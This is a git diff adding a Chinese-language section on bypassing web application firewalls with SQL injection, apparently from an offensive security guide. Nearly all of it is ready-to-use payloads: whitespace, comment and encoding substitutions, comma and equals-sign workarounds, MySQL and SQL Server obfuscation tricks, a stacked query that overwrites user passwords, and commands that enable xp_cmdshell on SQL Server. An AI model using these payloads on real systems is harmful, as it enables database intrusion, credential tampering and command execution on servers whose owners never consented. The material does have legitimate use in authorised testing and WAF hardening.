@@ -301,3 +301,170 @@ PostgreSQL
 [PostgreSQL持久化](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%8C%81%E4%B9%85%E5%8C%96/PostgreSQL.md)
 
 ## 10.WAF绕过
+
+### 通用绕过
+
+空格绕过
+
+```sql
+替代空格绕过
+id=1%09and%091=1%09--
+id=1%0Dand%0D1=1%0D--
+id=1%0Cand%0C1=1%0C--
+id=1%0Band%0B1=1%0B--
+id=1%0Aand%0A1=1%0A--
+id=1%A0and%A01=1%A0—
+
+注释绕过
+id=1/*comment*/and/**/1=1/**/--
+
+括号绕过
+id=(1)and(1)=(1)--
+```
+
+|描述|查询语句|
+|----|----|
+|MySQL V3|01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|
+|MySQL V5|09, 0A, 0B, 0C, 0D, A0, 20|
+|Oracle V11g|00, 0A, 0D, 0C, 09, 20|
+|SQL Server|01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20|
+|SQLite V3|0A, 0D, 0C, 09, 20|
+|PostgreSQL|0A, 0D, 0C, 09, 20|
+
+逗号绕过
+
+```sql
+LIMIT 0,1 --> LIMIT 1 OFFSET 0
+SUBSTR('SQL',1,1) --> SUBSTR('SQL' FROM 1 FOR 1)
+SELECT 1,2,3 --> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
+
+逻辑运算符
+select user from users WHERE (user_id=1) union select password from users where (user_id=1);
+
+编码
+SELECT%20user_id%2Cpassword%20FROM%20users;
+
+多个字符混淆导致无法正确处理逗号
+SELECT user/**/,password/**/FROM users where user_id = 1;
+```
+
+等于号绕过
+
+```sql
+like替代
+substr(database(),1,1)='d' --> substr(database(),1,1)like('d')
+
+正则表达式
+='d' --> REGEXP '^d$'
+
+BETWEEN条件运算
+select user from users where user_id = 1 and substr(database(),1,1) between 'a' and 'z';
+
+in 和 not in
+```
+
+字符串修改
+
+```sql
+?id=1 AND 1=1#
+?id=1 AnD 1=1#
+?id=1 aNd 1=1#
+
+and --> &&
+or --> ||
+= --> LIKE,REGEXP, BETWEEN, not < and not >
+> X --> not between 0 and X
+WHERE --> HAVING
+```
+
+### MySQL
+
+#### 列名称限制绕过
+
+```sql
+SELECT F.4 FROM (SELECT 1,2,3,4,5,6,7,8 UNION SELECT * FROM users)F;
+```
+
+#### 科学计数法
+
+```sql
+' or 1e0=1
+' or 1e000001 - 1e000001=0
+' or (1e1 / 2e0) = 5
+```
+
+### SQL Server
+
+#### 非标准空白字符
+```sql
+?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
+```
+
+#### UNION、科学计数法和十六进制的混淆
+```sql
+?id=0eunion+select+null,@@version,null--
+?id=0xunion+select+null,@@version,null--
+```
+
+#### from和列中间无空格
+```sql
+?id=1+union+select+null,@@version,null+from.users--
+```
+
+#### select查询之间的\分隔符
+```sql
+?id=0xunion+select\Nnull,@@version,null+from+users--
+```
+
+#### 非正统的堆叠查询
+```sql
+SELECT 'a' SELECT 'b'
+```
+
+例如多个查询：
+```sql
+use [tempdb]
+create table [test] ([id] int)
+insert [test] values(1)
+select [id] from [test]
+drop table[test]
+```
+
+简化为:
+```sql
+use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
+```
+
+#### 在末尾添加无用的exec()，使waf认为是无效查询
+```sql
+SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
+exec('select 1')--'
+```
+
+#### 使用奇怪的查询
+```
+SELECT id, username, password FROM users WHERE username = 'admin'
+exec('update[users]set[password]=''a''')--'
+```
+
+#### 启用 xp_cmdshell
+```sql
+select * from users where username = ' admin'
+exec('sp_configure''show advanced option'',''1''reconfigure')
+exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
+```
+
+### PostgreSQL
+
+#### 引号替换
+
+```sql
+SELECT CHR(65)||CHR(66)||CHR(67);
+```
+
+#### 使用$(>= PostgreSQL 版本 8)
+
+```sql
+SELECT $$This is a string$$
+SELECT $TAG$This is another string$TAG$
+```
